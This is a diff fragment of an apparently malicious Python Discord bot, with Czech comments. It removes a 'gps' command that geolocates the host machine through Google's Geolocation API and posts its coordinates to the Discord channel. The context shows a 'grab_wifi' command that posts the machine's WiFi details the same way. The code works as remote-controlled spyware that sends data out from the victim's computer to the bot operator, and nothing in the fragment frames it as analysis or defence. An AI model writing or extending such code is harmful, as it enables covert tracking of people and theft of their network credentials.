@@ -148,18 +148,6 @@ async def grab_wifi(ctx):
 
     await ctx.send(f"WiFi detaily:\n```\n{wifi_details}\n```")
 
-# Příkaz pro získání polohy pomocí Google Maps Geolocation API
-@bot.command(name='gps')
-async def gps(ctx):
-    api_key = 'YOUR_GOOGLE_MAPS_API_KEY'
-    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={api_key}"
-    response = requests.post(url, json={})
-    location = response.json()
-    lat = location['location']['lat']
-    lng = location['location']['lng']
-    accuracy = location['accuracy']
-    await ctx.send(f"Poloha: \nLatitude: {lat}\nLongitude: {lng}\nAccuracy: {accuracy} meters")
-
 # Příkaz pro zastavení bota
 @bot.command(name='stop')
 async def stop_bot(ctx):
